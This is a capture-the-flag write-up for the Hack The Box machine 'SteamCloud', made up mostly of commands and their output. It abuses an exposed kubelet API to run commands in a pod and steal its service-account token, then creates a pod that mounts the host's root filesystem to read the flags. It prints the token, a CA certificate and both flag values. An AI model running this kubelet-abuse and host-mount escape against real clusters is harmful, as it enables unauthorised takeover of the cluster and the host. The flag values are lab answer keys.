---
tags:
title: SteamCloud - Easy (HTB)
permalink: /SteamCloud-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
 nmap -p 2379,2380 -sV 10.129.96.167
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-11 23:17 -0500
Nmap scan report for 10.129.96.167
Host is up (0.47s latency).

PORT     STATE SERVICE          VERSION
2379/tcp open  ssl/etcd-client?
2380/tcp open  ssl/etcd-server?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.74 seconds
```

```bash
curl -sk https://10.129.96.167:10250/pods | jq -r '.items[].metadata | "Namespace: \(.namespace), Pod: \(.name)"'
Namespace: default, Pod: nginx
Namespace: kube-system, Pod: etcd-steamcloud
Namespace: kube-system, Pod: kube-apiserver-steamcloud
Namespace: kube-system, Pod: kube-controller-manager-steamcloud
Namespace: kube-system, Pod: kube-scheduler-steamcloud
Namespace: kube-system, Pod: storage-provisioner
Namespace: kube-system, Pod: kube-proxy-sd65c
Namespace: kube-system, Pod: coredns-78fcd69978-5vbfb
```

https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/kubernetes-enumeration.html

```bash
curl -sk -X POST "https://10.129.96.167:10250/run/default/nginx/nginx?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token"
eyJhbGciOiJSUzI1NiIsImtpZCI6InZxaVpia1F0Q01Fd3FNTHhfb3lVVEEzVEVuQk1Bd2wyLVZOTzNQcEhpQzQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODAyNDA1NzAyLCJpYXQiOjE3NzA4Njk3MDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjBkNjlmZDY2LTNkZGItNGNhMC04Yzk5LWVhNDYyZWRlMDc2YyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImQzZWE0ZTczLWViNWQtNDE2ZS04Zjc0LTY1MDI3MTNkZWZhNCJ9LCJ3YXJuYWZ0ZXIiOjE3NzA4NzMzMDl9LCJuYmYiOjE3NzA4Njk3MDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.BywTJEnRxmQ_-3Tw6FRhwvntyBVzYNYRLUBoyejhi9lOgLyYWOJMtBw8fr5NyC36ryM25CZuz5LBuMAa1PRUL2ud9MfuSk0dKhQdKYVGBrpkTB4r5fMmBA1bnNM9ifuuHjK78uP4cMImUg7BajvA6USD24GOZn2iimsg5schcLK68mLFDseAeFctWIGHn3cFGfxm8LK3ds4n6axNjdzzw1PN7P-9HsM-WHBHHR7NTM0-R6G07Zwzi0gPO18pQ1GO9Py28xA8b8aeW75hSS2QRQAmOIYWvEUjO9xBvv3vuFsnYszlzsSbbqHs1Gw4eQy9gZ834F7HKpu8Mgm_iJJhtw
```

```bash
curl -sk -X POST "https://10.129.96.167:10250/run/default/nginx/nginx?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
kf2eZIBNMp0TFg==
-----END CERTIFICATE-----
```

```bash
 kubectl --token=$token \
  --server=https://10.129.96.167:8443 \
  --certificate-authority=ca.crt \
  get pods
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          26m
```

```bash
root㉿kali)-[/home/zsln/Desktop/zsln/SteamCloud]
└─# kubectl --token=$token --server=https://10.129.96.167:8443 --certificate-authority=ca.crt apply -f pwn.yaml
pod/pwn-pod created

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/SteamCloud]
└─# kubectl --token=$token --server=https://10.129.96.167:8443 --certificate-authority=ca.crt exec -it pwn-pod -- /bin/bash
Error from server (Forbidden): pods "pwn-pod" is forbidden: User "system:serviceaccount:default:default" cannot create resource "pods/exec" in API group "" in the namespace "default"

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/SteamCloud]
└─# cat pwn.yaml
 cat pwnn.yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn
  namespace: default
spec:
  containers:
  - name: pwn
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt/host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
curl -sk -X POST "https://10.129.96.167:10250/run/default/nginx/nginx?cmd=whoami"
root
```

https://github.com/cyberark/kubeletctl/releases/tag/v1.13

```bash
┌──(root㉿kali)-[/home/zsln/Desktop/zsln/SteamCloud]
└─# ./kubeletctl --server 10.129.96.167 exec "cat /mnt/host/home/user/user.txt" -p pwn -c pwn
b816e4ed58661ac588c83b25e620f0ae

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/SteamCloud]
└─# ./kubeletctl --server 10.129.96.167 exec "cat /mnt/host/home/root/root.txt" -p pwn -c pwn
cat: /mnt/host/home/root/root.txt: No such file or directory
command terminated with exit code 1

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/SteamCloud]
└─# ./kubeletctl --server 10.129.96.167 exec "cat /mnt/host/root/root.txt" -p pwn -c pwn
80fe382c22329823bf93be8778cca0a1
```